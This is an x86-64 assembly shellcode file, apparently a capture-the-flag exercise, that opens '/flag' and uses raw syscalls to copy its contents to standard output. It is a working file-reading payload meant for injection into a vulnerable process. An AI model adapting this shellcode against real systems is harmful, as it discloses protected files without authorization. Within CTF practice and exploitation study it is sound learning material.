.globl _start
.intel_syntax noprefix

_start:
    lea edi, [rip+flag]     # Ptr to "/flag" string
    xor eax, eax
    mov al, 2               # SYS_open
    xor esi, esi            # O_RDONLY
    syscall

    xor edi, edi
    inc edi                 # fd out
    mov esi, eax            # fd in
    xor edx, edx            # skipped bytes
    mov bl, 88
    mov r10, rbx            # bytes to transfer
    mov al, 40              # SYS_sendfile
    syscall

    mov al, 60              # SYS_exit
    syscall

flag:
    .string "/flag"
